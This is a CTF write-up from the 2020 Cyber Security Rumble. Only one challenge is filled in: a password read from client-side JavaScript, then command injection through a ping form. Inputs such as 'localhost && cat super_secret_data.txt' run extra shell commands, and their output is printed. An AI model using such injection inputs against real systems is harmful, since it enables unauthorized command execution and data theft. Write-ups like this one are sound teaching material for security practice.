### Table of Contents
**[Summary](#summary)**<br>
**[Cyberwall](#cyberwall)**<br>
**[Zeh](#zeh)**<br>
**[Hashfun](#hashfun)**<br>
**[Wheels n Whales](#wheels-n-whales)**<br>


## Summary

https://ctf.cybersecurityrumble.de/

Team: Lockdown4Co19vid

Placement: 64th out of about 500 scoring teams

Notes: First CTF

Software Used:



## Cyberwall
We are greeted with a login screen that asks the user for their password. The `Lost Password` button just sends an alert to the browser.

![login](https://github.com/nkeil/ctf_writeups/main/2020_cyber_security_rumble_germany/images/login.png?raw=true)

If we look at the HTML file, we can find embedded JavaScript code that is used to validate the password, which gives us the password in plain text.

```
function checkPw() {
  var pass = document.getElementsByName('passwd')[0].value;
  if (pass != "rootpw1337") {
    alert("This Password is invalid!");
    return false;
  }
  window.location.replace("management.html");
}
```

After we login, we find links to 5 pages, 4 of which have just text and images. The 5th however, has an input box to `Test Host Connection` by inputting an argument to `ping`. 

![ping](https://github.com/nkeil/ctf_writeups/main/2020_cyber_security_rumble_germany/images/ping.png?raw=true)

Since our input is being used in the form `ping [input]`, we can test the amount of checks being done on the input by appending another command after the hostname such as `localhost && ls -l`, which successfully gives us the output:

```
-rw-r--r-- 1 root root   16 Oct 15 12:49 requirements.txt
drwxr-xr-x 3 root root 4096 Oct 15 12:49 static
-rw-r--r-- 1 root root   85 Oct 15 12:49 super_secret_data.txt
drwxr-xr-x 2 root root 4096 Oct 15 12:49 templates
-rw-r--r-- 1 root root 1070 Oct 15 12:49 webapp.py
-rw-r--r-- 1 root root   23 Oct 15 12:49 wsgi.py
```

We now can read the file `super_secret_data.txt` with the input `localhost && cat super_secret_data.txt`, giving us the flag
```
CSR{oh_damnit_should_have_banned_curl_https://news.ycombinator.com/item?id=19507225}
```

## Zeh
## Hashfun
## Wheels n Whales
